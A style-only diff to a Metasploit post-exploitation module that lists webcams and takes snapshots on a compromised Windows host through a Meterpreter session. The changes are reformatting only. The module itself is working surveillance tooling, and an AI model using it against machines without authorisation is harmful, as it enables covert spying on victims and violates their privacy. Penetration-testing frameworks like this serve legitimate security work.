@@ -6,32 +6,34 @@
 class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Windows Manage Webcam',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Webcam',
+        'Description' => %q{
           This module will allow the user to detect installed webcams (with
           the LIST action) or take a snapshot (with the SNAPSHOT) action.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'win'],
-      'SessionTypes'  => [ "meterpreter" ],
-      'Actions'       =>
-        [
-          [ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'sinn3r'],
+        'Platform' => [ 'win'],
+        'SessionTypes' => [ "meterpreter" ],
+        'Actions' => [
+          [ 'LIST', { 'Description' => 'Show a list of webcams' } ],
           [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ]
         ],
-      'DefaultAction' => 'LIST'
-    ))
+        'DefaultAction' => 'LIST'
+      )
+    )
 
     register_options(
       [
-        OptInt.new('INDEX',   [false, 'The index of the webcam to use', 1]),
+        OptInt.new('INDEX', [false, 'The index of the webcam to use', 1]),
         OptInt.new('QUALITY', [false, 'The JPEG image quality', 50])
-      ])
+      ]
+    )
   end
-
 
   def run
     if client.nil?
@@ -52,11 +54,9 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
   def rhost
     client.sock.peerhost
   end
-
 
   def snapshot
     webcams = list_webcams
@@ -66,7 +66,7 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    if not webcams[datastore['INDEX']-1]
+    if not webcams[datastore['INDEX'] - 1]
       print_error("#{rhost} - No such index: #{datastore['INDEX'].to_s}")
       return
     end
@@ -101,8 +101,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
-  def list_webcams(show=false)
+  def list_webcams(show = false)
     begin
       webcams = client.webcam.webcam_list
     rescue Rex::Post::Meterpreter::RequestError
@@ -111,13 +110,13 @@ class MetasploitModule < Msf::Post
 
     if show
       tbl = Rex::Text::Table.new(
-        'Header'  => 'Webcam List',
-        'Indent'  => 1,
+        'Header' => 'Webcam List',
+        'Indent' => 1,
         'Columns' => ['Index', 'Name']
       )
 
       webcams.each_with_index do |name, indx|
-        tbl <<  [(indx+1).to_s, name]
+        tbl << [(indx + 1).to_s, name]
       end
 
       print_line(tbl.to_s)
@@ -126,4 +125,3 @@ class MetasploitModule < Msf::Post
     return webcams
   end
 end
-
